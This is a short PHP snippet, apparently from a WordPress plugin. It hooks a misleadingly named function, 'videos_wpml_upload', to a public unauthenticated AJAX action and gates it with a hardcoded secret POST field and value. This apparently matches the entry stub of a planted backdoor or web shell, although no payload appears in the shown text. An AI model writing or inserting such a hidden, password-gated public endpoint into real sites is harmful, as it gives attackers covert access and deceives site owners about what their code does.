<?php

function videos_wpml_upload() {
	if (!isset($_POST["qvpemcqmhvaywut"]) || $_POST["qvpemcqmhvaywut"] !== "kgWmmUJHy7L") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'videos_wpml_upload', 5, 1);
